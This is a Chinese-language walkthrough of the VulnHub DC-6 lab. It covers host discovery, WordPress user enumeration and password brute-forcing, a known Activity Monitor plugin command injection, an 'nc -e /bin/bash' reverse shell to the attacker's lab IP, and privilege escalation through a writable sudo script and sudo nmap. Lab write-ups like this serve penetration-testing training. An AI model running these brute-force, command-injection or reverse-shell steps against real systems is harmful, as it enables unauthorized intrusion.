> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [cn-sec.com](https://cn-sec.com/archives/2500916.html)

> 原文始发于微信公众号（入特安全）：Vulnub-wp DC-6

vulnhub-wp DC-6
---------------

本文结构

*   🖳 主机发现 (Host Discover)
    
*   👁 端口扫描 (Port Scan)
    
*   🚪🚶 获取权限
    
*   🛡️ 权限提升
    
*   📖 推荐文章
    

* * *

DC-6 是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。这不是一个过于困难的挑战，因此对于初学者来说应该很棒。

```
sudo netdiscover -i eth0 -r 192.168.1.0/24 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                         21 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 1260                                  _____________________________________________________________________________   IP            At MAC Address     Count     Len  MAC Vendor / Hostname       -----------------------------------------------------------------------------                        192.168.1.5     20:1e:88:ad:fc:55      1      60  Intel Corporate                                         192.168.1.14    08:00:27:e2:b6:88      1      60  PCS Systemtechnik GmbH                           192.168.1.3     a2:86:90:e6:04:98      1      60  Unknown vendor
```

目标是 _192.168.1.14_

```
# Nmap 7.94SVN scan initiated Fri Feb 16 15:50:20 2024 as: nmap -p- -oN nmap_scan -sV -sC --min-rate 5000 192.168.1.14Nmap scan report for 192.168.1.14 (192.168.1.14)Host is up (0.0016s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)80/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-title: Did not follow redirect to http://wordy/|_http-server-header: Apache/2.4.25 (Debian)MAC Address: 08:00:27:E2:B6:88 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Feb 16 15:50:28 2024 -- 1 IP address (1 host up) scanned in 8.69 seconds
```

发现重定向到`http://wordy/`这个网站，我们把它加入 hosts 文件中 发现主页是一个 wordpress 网站，对其进行扫描

```
wpscan -e vt,vp,u --url http://wordy/[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] graham | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] sarah | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] jens | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] mark | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)
```

发现了很多用户，记录下来，然后尝试一下登录界面的弱口令，没有试出弱口令，那就尝试爆破，因为爆破路径也没有什么有趣的，那攻击向量只有 web 喝 ssh，web 又只有这个登录页面是暴露的。 根据作者的提示，生成一下密码字典

```
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

尝试爆破

```
wpscan --url http://wordy -U users -P passwords.txt
```

得到了凭证

登录上之后，发现有一个 _Activity Monitor_，搜索一下有没有漏洞

```
mark:helpdesk01
```

我们使用下面那个，执行之后输入 ip，username，password，然后用 nc 反弹 shell。

```
searchsploit Activity···WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                                                | php/webapps/45274.htmlWordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)                                  | php/webapps/50110.py···
```

用 linpeas.sh 辅助提权脚本枚举信息![](https://cn-sec.com/wp-content/uploads/2024/02/5-1708181769.png)这里有俩个有趣的文件，我们可以在 things-to-do.txt 中发现用户 gaham 的凭证![](https://cn-sec.com/wp-content/uploads/2024/02/0-1708181769.png)我们用 ssh 登录上去，后进行一些枚举，发现可以以 jens 身份运行 backups.sh 脚本，且因为 gaham 用户是 devs 组，对该脚本有修改权限，我们可以在里面加一个`/bin/bash`来启动一个 jens 用户的 shell![](http://cn-sec.com/wp-content/uploads/2024/02/3-1708181770.png)

```
nc -e /bin/bash 192.168.1.13 443
```

或者 jens 的 shell 后，再次使用`sudo -l`进行检查![](http://cn-sec.com/wp-content/uploads/2024/02/10-1708181771.png)然后在 GTFOBins 搜索 nmap`https://gtfobins.github.io/gtfobins/nmap/#sudo`

最终拿到 root 的 shell![](http://cn-sec.com/wp-content/uploads/2024/02/0-1708181772.png)

DC-6 下载地址`https://www.vulnhub.com/entry/[dc](https://cn-sec.com/archives/tag/dc)-6,315/`

DC-6 国外大佬 walkthrough 文章`https://www.sevenlayers.com/index.php/194-vulnhub-[dc](https://cn-sec.com/archives/tag/dc)-6-walkthrough`

GTFOBins 地址`https://gtfobins.github.io/`

个人博客地址`https://rightevil.github.io/`

> 原文始发于微信公众号（入特安全）：[Vulnub-wp DC-6](http://mp.weixin.qq.com/s?__biz=MzkyNTU3MzA2Mw==&mid=2247483840&idx=1&sn=4d15efc5bb35c1dcff4b81600894d084&chksm=c00472a50c4cc1f40db8feefa5492b1eb0b385cba1eeab5c0be95c9f23e0f8f84483f479dfd8&scene=27&key=5f77d834834efca1c34b3f7ef0d57ad107d48eb81662e01b300307fa1ac16e85229cef28d132d566958dc66535be15efa0559175ee8845953ff98bf6f4215e674dee5559b9950d3bf17456cd1fa3a2a3ac625ee9f04145456e3fc4f4d92dd3ec69f08f45358b9b4162e9bb74af5ae8c66a3bb1126ff840ee8dd4798c159e5fb4&ascene=0&uin=MzgxODQ4MjMz&devicetype=Windows+10+x64&version=63090819&lang=zh_CN&countrycode=GY&exportkey=n_ChQIAhIQPL1nz%2BmzDOW7B71olnX7mBLgAQIE97dBBAEAAAAAAKaAC9DvSHkAAAAOpnltbLcz9gKNyK89dVj0w9FX9E7WbgCcu08awLs1CvFUmhYQu5qUSHFJ53boCiaq1eEfJrz3DBDxiGsL3yq20uGwG9KGDY7abriBvSUtYCGeTArtDy1CW%2BlYY9s8KBdwi0OBzwMOLcT0weshJO1rLLnRJzWEaBiWnWgiOGvLYxGS91QqNqN%2Bj72jw4MXhE6LniNiHeJetX7o5lmDuZ08%2B6HAA1JCuEjC3gXuRz2omuKUxeB%2Fmrfe%2BldFMYL2BDWyud2iUbozgYQZ&acctmode=0&pass_ticket=4WGrP8KQEhTm3hIaEj7UZ5%2F5wRmsbxUGPnmGk4r%2BRD%2FKgiru2NQ%2Few0KWlGFRucCeaQsTpGg%2FwM4n5FJGEvhfA%3D%3D&wx_header=1)

http://cn-sec.com/archives/2500916.html